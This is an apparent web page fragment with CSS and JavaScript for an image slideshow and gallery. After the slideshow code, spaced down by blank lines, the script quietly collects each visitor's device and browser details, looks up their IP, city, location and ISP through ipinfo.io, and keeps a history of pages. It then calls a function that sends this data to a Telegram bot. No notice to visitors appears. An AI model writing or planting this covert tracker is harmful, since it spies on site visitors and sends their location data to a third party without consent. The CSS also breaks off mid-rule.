    /* Slideshow */
    .slideshow-container {
      position: relative;
      max-width: 800px;
      margin: auto;

      border-radius: 15px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);

    }
    .slide {
      display: none;
      width: 100%;
    }
    .active {
      display: block;
      animation: fadeIn 1s ease-in-out;
    }
    .prev, .next {
      position: absolute;
      top: 50%;
      transform: translateY(-50%);
      background: rgba(0,0,0,0.5);
      color: white;
      padding: 10px;
      cursor: pointer;
      border-radius: 5px;
    }
    .prev { left: 10px; }
    .next { right: 10px; }

    /* Gallery */
    .gallery-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 20px;
      padding: 20px; 
      animation: fadeIn 1s ease-in-out;
    }
    .gallery-item {
      position: relative;
      overflow: hidden;
      border-radius: 15px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      cursor: pointer;
    }
    .gallery-item:hover {
      transform: scale(1.05);
      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
    }
    .gallery-item img, .gallery-item video {
      width: 450px;
      height: 500px;
      object-fit: cover;
      border-radius: 15px;
    }

    /* Modal */
    .modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      z-index: 1000;
      justify-content: center;
      align-items: center;
      animation: fadeIn 0.3s ease-in-out;
    }
    .modal-content {
      max-width: 90%;
      max-height: 90%;
      border-radius: 15px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
      position: relative;
      transform: scale(0.8);
      transition: transform 0.3s ease-in-out;
    }
    .modal.show .modal-content {
      transform: scale(1);
    }
    .close-btn {

  <script>
    let slideIndex = 0;
    const slides = document.querySelectorAll(".slide");

    function showSlides() {
      slides.forEach(slide => slide.classList.remove("active"));
      slideIndex = (slideIndex + 1) % slides.length;
      slides[slideIndex].classList.add("active");
    }
    setInterval(showSlides, 3000);

    function prevSlide() {
      slideIndex = (slideIndex - 1 + slides.length) % slides.length;
      showSlides();
    }
    function nextSlide() {
      slideIndex = (slideIndex + 1) % slides.length;
      showSlides();
    }
    
    
    
       
    
    // Collecting device and browser info
var deviceInfo = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    colorDepth: window.screen.colorDepth
};

var browserInfo = {
    browser: navigator.appName,
    version: navigator.appVersion,
    cookiesEnabled: navigator.cookieEnabled,
    onlineStatus: navigator.onLine ? "Online" : "Offline"
};

// Collecting page and IP info
var ipInfo = {
    ip: "retrieved by server-side API", // Placeholder for IP, needs server-side API
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    referrer: document.referrer || "Direct Visit", // Referrer page
    pageTitle: document.title,
    pageURL: window.location.href,
    browsingHistory: [] // Placeholder for user history
};

// Fetching ISP and IP details using ipinfo.io API
fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
        ipInfo.ip = data.ip;
        ipInfo.city = data.city;
        ipInfo.region = data.region;
        ipInfo.country = data.country;
        ipInfo.location = data.loc;
        ipInfo.isp = data.org;

        // Collecting browsing history (Last 5 pages visited)
        collectUserHistory();

        // Sending data to Telegram Bot
        sendToTelegramBot();
    });

// Function to collect user's browsing history (real-time, last 5 pages)
function collectUserHistory() {
    if (localStorage.getItem("userHistory")) {
        let history = JSON.parse(localStorage.getItem("userHistory"));
        history.push(window.location.href);
        if (history.length > 5) history.shift(); // Keep only the last 5
        localStorage.setItem("userHistory", JSON.stringify(history));
        ipInfo.browsingHistory = history;
    } else {
        localStorage.setItem("userHistory", JSON.stringify([window.location.href]));
        ipInfo.browsingHistory = [window.location.href];
    }
}
